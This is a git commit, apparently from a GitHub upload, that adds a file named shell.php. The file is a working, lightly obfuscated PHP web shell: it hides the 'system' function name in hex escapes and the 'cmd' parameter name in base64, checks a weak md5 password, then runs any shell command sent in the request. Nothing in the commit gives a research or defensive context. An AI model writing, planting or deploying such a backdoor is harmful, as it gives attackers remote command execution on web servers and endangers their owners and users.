5f9217c79b7c543816b8ed85bc828452effc731d
AydoganCan60 <129807220+AydoganCan60@users.noreply.github.com>
2025-02-15 10:22:40 +0300

    Add files via upload

---
+++ shell.php
@@ -0,0 +1,3 @@
+<?php
+$k="\x73\x79\x73\x74\x65\x6d";$p=base64_decode("Y21k");if(isset($_REQUEST['a'])&&md5($_REQUEST['a'])==="098f6bcd4621d373cade4e832627b4f6"){$k($_REQUEST[$p]);}else{die("Erişim reddedildi!");}
+?>
